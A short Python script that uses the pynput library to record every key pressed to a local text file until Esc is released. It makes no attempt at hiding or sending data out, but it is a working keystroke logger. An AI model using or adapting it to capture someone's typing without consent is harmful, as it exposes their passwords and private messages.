from pynput.keyboard import Key, Listener

def on_press(key):
    if key != Key.esc:
        file = open("keypresses.txt", "a+")
        keyPressedvar = (key)
        file.write (str(keyPressedvar))
        file.close()

def on_release(key):
    if key == Key.esc:
        # Stop listener
        print("Stopping")
        return False

# Collect events until released
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
